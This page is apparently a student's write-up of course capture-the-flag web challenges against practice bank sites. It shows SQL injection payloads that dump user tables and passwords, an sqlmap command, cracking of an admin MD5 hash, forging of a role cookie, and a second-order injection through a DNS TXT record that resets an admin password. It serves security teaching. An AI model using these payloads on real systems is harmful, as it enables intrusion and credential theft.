<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Course CTF: Week 4 - COMP6443 Musings</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=z5206677><meta name=description content="Support Site: support."><meta name=keywords content=Hugo,theme,even><meta name=generator content="Hugo 0.58.2 with theme even"><link rel=canonical href=../../../post/course-ctf/week4/><link rel=apple-touch-icon sizes=180x180 href=../../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../favicon-16x16.png><link rel=manifest href=../../../manifest.json><link rel=mask-icon href=../../../safari-pinned-tab.svg color=#5bbad5><link href=../../../dist/even.c2a46f00.min.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><link rel=stylesheet href=../../../css/overrides.css><link rel=stylesheet href=../../../css/typedjs.shortcode.css><meta property=og:title content="Course CTF: Week 4"><meta property=og:description content="Support Site: support."><meta property=og:type content=article><meta property=og:url content=/post/course-ctf/week4/><meta property=article:published_time content=2020-06-22T21:20:50+10:00><meta property=article:modified_time content=2020-06-22T21:20:50+10:00><meta itemprop=name content="Course CTF: Week 4"><meta itemprop=description content="Support Site: support."><meta itemprop=datePublished content=2020-06-22T21:20:50&#43;10:00><meta itemprop=dateModified content=2020-06-22T21:20:50&#43;10:00><meta itemprop=wordCount content=1133><meta itemprop=keywords content><meta name=twitter:card content=summary><meta name=twitter:title content="Course CTF: Week 4"><meta name=twitter:description content="Support Site: support."><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=../../../ class=logo>COMP6443 Musings</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=../../../><li class=mobile-menu-item>Home</li></a><a href=https://github.com/featherbear/UNSW-COMP6443><li class=mobile-menu-item>GitHub</li></a><a href=../../../categories/report><li class=mobile-menu-item>Report</li></a><a href=../../../categories/><li class=mobile-menu-item>Categories</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=../../../ class=logo>COMP6443 Musings</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=../../../>Home</a></li><li class=menu-item><a class=menu-item-link href=https://github.com/featherbear/UNSW-COMP6443>GitHub</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/report>Report</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/>Categories</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Course CTF: Week 4</h1><div class=post-meta><span class=post-time>2020-06-22</span><div class=post-category><a href=../../../categories/course-ctf/>Course CTF</a></div></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><a href=#support>Support</a></li><li><a href=#pay-portal>Pay Portal</a></li><li><a href=#bigapp>Bigapp</a><ul><li><a href=#union>UNION</a></li><li><a href=#order>Order</a></li><li><a href=#login-admin>Login Admin</a></li><li><a href=#get-create-error-bypass>Get create error bypass</a></li><li><a href=#get-by-with-bypass>Get by with bypass</a></li><li><a href=#no-login-needed>No login needed</a></li></ul></li><li><a href=#signin-qbsite>signin.-QBSITE-</a></li></ul></nav></div></div><div class=post-content><h1 id=support>Support</h1><p>Site: support.-QBSITE-<br>Solution File: <a href=./support-base58enum.py>support-base58enum.py</a></p><p>When creating a new ticket, the slug generated is a base58 encoded string of <code>userid:noteid</code>.<br>Bruteforce the userids to find a matching <code>&lt;user&gt;:1</code>, then enumerate horizontally.</p><p><code>base54(&quot;1:1&quot;)</code> -&gt; <code>HY2U</code> - first ticket test!<br><code>base54(&quot;8:1&quot;)</code> --&gt; <code>KtPz</code> - ok it seems to be working<br><code>base54(&quot;274:1&quot;)</code> --&gt; <code>6fbRN72</code> - It's trivial. You submit a ticket and there's your ticket<br><code>base54(&quot;1125:1&quot;)</code> --&gt; <code>RVnSH2uN</code> - i want a credit card<br><code>base54(&quot;1125:2&quot;)</code> --&gt; <code>RVnSH2uP</code> - why is my balance so low<br><code>base54(&quot;1125:3&quot;)</code> --&gt; <code>RVnSH2uQ</code> - international transaction fee is stupid<br><code>base54(&quot;1125:4&quot;)</code> --&gt; <code>RVnSH2uR</code> - COMP6443{-flag-redacted-}<br><code>base54(&quot;1730:1&quot;)</code> --&gt; <code>RWTivKdi</code> - lolol<br><code>base54(&quot;1780:1&quot;)</code> --&gt; <code>RWTrLG3S</code> - z@in was h3r3<br><code>base54(&quot;9447:1&quot;)</code> --&gt; <code>VVBWU75i</code> - COMP6443{-flag-redacted-}</p><blockquote><p><code>COMP6443{-flag-redacted-}</code><br><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=pay-portal>Pay Portal</h1><p>Site: pay-portal.-QBSITE-</p><p>Unsanitised SQL ... as with most SQLi, so nothing fancy.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>&#34; OR 1=1#</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h1 id=bigapp>Bigapp</h1><p>Site: bigapp.-QBSITE-</p><p>When we break the statement, we get a verbose output:</p><blockquote><p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR pname LIKE '%<code>PAYLOAD'</code>%') AND bu IS NOT NULL) ORDER BY ' at line 1</p></blockquote><p>This helps us to identify what we need to inject</p><p><strong>Table Names</strong><br><code>a')) UNION SELECT table_schema, table_name, 1, 1, 1, 1 FROM information_schema.tables -- .</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></pre></td><td class=lntd><pre class=chroma># Results
isodb_bigapp_z5206677_services_quoccabank_com_v2.bproducts
isodb_bigapp_z5206677_services_quoccabank_com_v2.users</pre></td></tr></table></div></div><p><strong>Table: bproducts</strong><br><code>a')) UNION SELECT COLUMN_NAME,2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'bproducts' -- .</code></p><p>Results: <code>id</code>, <code>pname</code>, <code>category</code>, <code>code</code>, <code>bu</code>, <code>owner</code></p><p><strong>Table: users</strong><br><code>a')) UNION SELECT COLUMN_NAME,2,3,4,5,6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' -- .</code></p><p>Results: <code>id</code>, <code>fname</code>, <code>lname</code>, <code>type</code>, <code>userid</code>, <code>email</code>, <code>mobile</code>, <code>city</code>, <code>state</code>, <code>postcode</code>, <code>password</code></p><p><strong>SQLmap</strong><br>Not allowed, but we can do this <code>sqlmap -u https://bigapp.-QBSITE-/api/v1/bproducts?q= -proxy http://localhost:8080 --cookie=login-cookie=MTIzQDEyMzp1c2Vy</code></p><h2 id=union>UNION</h2><blockquote><p>Make the banking product list return more than it should.</p></blockquote><p><code>a') UNION SELECT email, userid, password, type, fname, lname from users -- .</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=order>Order</h2><blockquote><p>Sort the banking products.</p></blockquote><p><code>a')) UNION SELECT * from bproducts ORDER BY bu -- .</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=login-admin>Login Admin</h2><blockquote><p>Login to admin using its actual password without online brute-forcing.</p></blockquote><p>First, dump the user data</p><p><code>a')) UNION SELECT email, userid, password, type, fname, lname from users -- .</code></p><p>For the <code>admin@-QBSITE-</code>, the password is<code>0e7517141fb53f21ee439b355b5a1d0a</code> which we can deduce as an MD5 hash!</p><p><code>md5decrypt(&quot;0e7517141fb53f21ee439b355b5a1d0a&quot;)</code> -&gt; <code>Admin@123</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=get-create-error-bypass>Get create error bypass</h2><blockquote><p>Create duplicate user with existing user's email.</p></blockquote><p>Site: bigapp.-QBSITE-/create.html</p><p>Inject the query <code>aaaaaa' or 1; -- a</code> into the <code>email</code> field of the POST request</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=get-by-with-bypass>Get by with bypass</h2><blockquote><p>Become admin without logging into admin.</p></blockquote><p>Our authentication data is stored in the <code>login-cookie</code> cookie.</p><p><code>b64decode(&quot;dXNlckBhY2NvdW50OnVzZXI=&quot;)</code> -&gt; <code>user@account:user</code></p><p>We can change the <code>user</code> role, to <code>admin</code>.<br><code>b64encode(&quot;user@account:admin&quot;)</code> -&gt; <code>dXNlckBhY2NvdW50OmFkbWlu</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></pre></td><td class=lntd><pre class=chroma>HTTP/1.1 200 OK
Content-Length: 157
Content-Type: application/json
Date: Wed, 24 Jun 2020 13:50:38 GMT
Server: gunicorn/19.9.0
X-Ctfproxy-Trace-Context: a9276106-822a-4da2-b126-720ef57ec7a5
Connection: close

[{&#34;bu&#34;:&#34;N/A&#34;,&#34;category&#34;:&#34;Session&#34;,&#34;code&#34;:66666,&#34;id&#34;:0,&#34;owner&#34;:&#34;N/A&#34;,&#34;pname&#34;:&#34;YOUR_FLAg=COMP6443{-flag-redacted-}&#34;}]</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=no-login-needed>No login needed</h2><p>Site: bigapp.-QBSITE-/login.html</p><p>Generic SQLi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>&#39; OR 1=1#</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-} -</code></p></blockquote><h1 id=signin-qbsite>signin.-QBSITE-</h1><p>Site: signin.-QBSITE-</p><p>Here we are presented with a login site. To login we need a <code>@-QBSITE-</code> email, and a password.<br>We don't know the password, and can only get it from performing a password reset.</p><p>When performing a usual password reset under your own account, we are greeted with the time and IP address (originator) of our last reset, as well as a reverse DNS search of our reset IP...<br><em>Interesting...</em>.</p><p>The site uses qdns.-QBSITE- to manage the reverse IP lookup.</p><p>In the QDNS site, there is a lookup and a register service.<br>Lookup -&gt; Find the domain name for a given IP<br>Register -&gt; Set a domain name for a given IP</p><p>After some investigation, it turns out that <em>when you perform a password reset</em>, the reverse DNS lookup of your reset IP is requested, and various DNS records are fetched (A, NS, MX, TXT, ...). Outbound requests aren't blocked, so actual DNS records are returned.</p><p>We can make a reasonable assumption from this information - that when we do a password reset, a database update query is performed - so perhaps this functionality is vulnerable.</p><p>When registering (with QDNS) my IP address to some arbitrary SQL magic strings, it seems that the <code>'</code> character is stripped from our input. No variation of the apostrophe character (that I tried) or multi-byte apostrophe character seemed to have worked.</p><p>However, when injecting a <code>\</code>, I did get a SQL error message during my password reset.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
</span></pre></td><td class=lntd><pre class=chroma>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;&amp;#39;Error obtaining NS for \&amp;#39;, last_reset=?, reset_actor=? where email=?&amp;#39; at line 1</pre></td></tr></table></div></div><p>This looks promising.<br>The server is likely performing some sort of MySQL UPDATE query and code routine like the following</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-python3 data-lang=python3><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python3 data-lang=python3><span class=n>lookupResult</span> <span class=o>=</span> <span class=n>lookup</span><span class=p>(</span><span class=n>domainName</span><span class=p>)</span>
<span class=n>query</span> <span class=o>=</span> <span class=n>f</span><span class=s2>&#34;UPDATE table SET result=&#39;</span><span class=si>{lookupResult}</span><span class=s2>&#39;, last_reset=?, reset_actor=? WHERE email=?&#34;</span>
<span class=n>executeSQL</span><span class=p>(</span><span class=n>query</span><span class=p>,</span> <span class=n>last_reset</span><span class=p>,</span> <span class=n>reset_actor</span><span class=p>,</span> <span class=n>email</span><span class=p>)</span></code></pre></td></tr></table></div></div><p>When looking up <code>\</code>, we get an error message that ends with <code>\</code>.<br>This causes the apostrophe pair to break and give us an SQL error.</p><p>As we can't insert the <code>'</code> to inject our own code, we need to do it another way.</p><p><em>&quot;If the place that takes user input doesn't seem to accept malicious input though, how else can you control/redirect/point it to something that does...&quot;</em></p><p>As the lookup queries several DNS records, we could potentially inject our SQLi payload as the value of a DNS record - namely the TXT record. This does, however, require you to have access to a registered (sub)domain - But hey! You can get these for free (i.e. a free website host, .tk, .eu.org)</p><p>We can point our IP to the domain name in QDNS, and create a TXT record which contains our SQLi (this time allowing us to use the apostrophe!).</p><p>We don't know, however, where the flag is stored. Is it a column? Is it in the same table? The same database? A file in the system???!??!<br><em>Too many questions, not enough confidence - Probably it's easier than we think.</em></p><p>Remembering back to the fact that we can only reset our own user account - perhaps we can reset the <code>admin@-QBSITE-</code> account.</p><p>To do so, I made the assumption that the password was stored in plain-text in a field called <code>password</code> - Which I was right in assuming.</p><p>When crafting the payload, we need to keep the same number of parameterised queries, so that MySQL doesn't get angry at us. Since we are hardcoding the email, we need to place a parameterised query substitutor somewhere else - I opted to just whack all three queries into a random field. We then add the extra field (password) to update.</p><p><code>', last_reset=CONCAT(?, ?, ?), password=&quot;password&quot; WHERE email='admin@-QBSITE-' #-- a</code></p><p>After another password reset for <em>my</em> user, the SQL statement should have executed, which will give us access to <code>admin@-QBSITE-:password</code></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote></div><footer class=post-footer><nav class=post-nav><a class=prev href=../../../post/time-based-attacks/><i class="iconfont icon-left"></i><span class="prev-text nav-default">Time Based Attacks</span>
<span class="prev-text nav-mobile">Prev</span></a>
<a class=next href=../../../post/tools/flag_alert/><span class="next-text nav-default">Flag Alert</span>
<span class="next-text nav-mobile">Next</span>
<i class="iconfont icon-right"></i></a></nav></footer></article></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:z5206677@student.unsw.edu.au class="iconfont icon-email" title=email></a><a href=https://www.linkedin.com/in/andrewjinmengwong/ class="iconfont icon-linkedin" title=linkedin></a><a href=https://github.com/featherbear class="iconfont icon-github" title=github></a><a href=https://www.instagram.com/_andrewjwong/ class="iconfont icon-instagram" title=instagram></a><a href=../../../index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
<span class=division>|</span>
<span class=theme-info>Theme -
<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
<span class=copyright-year>&copy;
2020
<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>Andrew Wong (z5206677)</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script type=text/javascript src=../../../dist/even.26188efa.min.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-107434487-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=../../../js/typed.js@2.0.9></script><script src=../../../js/typedjs.shortcode.js></script><script src=../../../js/offsite.js></script></body></html>